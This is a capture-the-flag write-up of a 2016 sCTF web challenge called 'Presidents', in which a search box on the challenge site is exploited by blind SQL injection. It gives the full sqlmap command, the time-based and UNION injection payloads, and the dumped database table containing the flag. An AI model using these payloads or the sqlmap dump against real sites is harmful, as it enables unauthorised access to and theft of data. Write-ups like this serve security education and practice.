### Solved by z0rex

Presidents was a web challenge worth 40 points.

> I just created a site with a list of popular presidential candidates!

We're greated with a list of candidates and a search box

![Screenshot 01](/hackpwn/writeups/wiki/images/CTF/2016/sCTF/presidents/01.png)

Messing with the search field reveals that it's vulnerable to blind SQL injection.

![Screenshot 02](/hackpwn/writeups/wiki/images/CTF/2016/sCTF/presidents/02.png)

![Screenshot 03](/hackpwn/writeups/wiki/images/CTF/2016/sCTF/presidents/03.png)

So, because I'm a lazy person, and really hate blind injections I turned to SQLmap.

After getting the databases and the one table I dumped the content of `candidates`

```
# sqlmap -u "http://president.sctf.michaelz.xyz/" --data="search=*" --dbms=mysql -D sctf_injection -T candidates --dump-all
         _
 ___ ___| |_____ ___ ___  {1.0.4.0#dev}
|_ -| . | |     | .'| . |
|___|_  |_|_|_|_|__,|  _|
      |_|           |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 18:48:30

custom injection marking character ('*') found in option '--data'. Do you want to process it? [Y/n/q] 
[18:48:30] [INFO] testing connection to the target URL
[18:48:31] [INFO] heuristics detected web page charset 'ascii'
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: #1* ((custom) POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
    Payload: search=') AND (SELECT * FROM (SELECT(SLEEP(5)))Coki) AND ('tGUl'='tGUl

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: search=') UNION ALL SELECT NULL,NULL,CONCAT(0x71626b7671,0x596d715659574d714d6f6f635a45787879714979666a4c584f4a7454464a574c41737963557a5479,0x716a7a6a71),NULL,NULL,NULL,NULL-- -
---
[18:48:31] [INFO] testing MySQL
[18:48:31] [INFO] confirming MySQL
[18:48:31] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.7, PHP 5.5.9
back-end DBMS: MySQL >= 5.0.0
[18:48:31] [INFO] sqlmap will dump entries of all tables from all databases now
[18:48:31] [INFO] fetching tables for database: 'sctf_injection'
[18:48:31] [INFO] fetching columns for table 'candidates' in database 'sctf_injection'
[18:48:31] [INFO] fetching entries for table 'candidates' in database 'sctf_injection'
[18:48:31] [INFO] analyzing table dump for possible password hashes
Database: sctf_injection
Table: candidates
[6 entries]
+----+------+----------------------------------------------------------------------+------------+---------+------------------------------------------------+---------+
| id | hide | pic                                                                  | party      | last    | comment                                        | first   |
+----+------+----------------------------------------------------------------------+------------+---------+------------------------------------------------+---------+
| 1  | 0    | http://www.politics1.com/pix2/clinton-2016.jpg                       | Democratic | Clinton | <blank>                                        | Hillary |
| 2  | 0    | http://www.politics1.com/pix2/berniesanders.jpg                      | Democratic | Sanders | <blank>                                        | Bernie  |
| 3  | 0    | http://www.politics1.com/pix2/TedCruz.jpg                            | Republican | Cruz    | <blank>                                        | Ted     |
| 4  | 0    | http://www.politics1.com/pix2/Kasich16.jpg                           | Republican | Kasich  | <blank>                                        | John    |
| 5  | 0    | http://www.politics1.com/pix2/trump.jpg                              | Republican | Trump   | <blank>                                        | Donald  |
| 6  | 1    | https://rosettastoneweb.files.wordpress.com/2015/11/vforvendetta.jpg | Anonymous  | Hacker  | sctf{why_do_people_still_make_sites_like_this} | The     |
+----+------+----------------------------------------------------------------------+------------+---------+------------------------------------------------+---------+
```

Here we can also see that SQLmap reports that it's vulnerable to union injection 
with a closing parentecy. Should probably have caught that, but it's still a win.

Now, if we look in the comment column we can see the flag on row 6.

Flag: `sctf{why_do_people_still_make_sites_like_this}`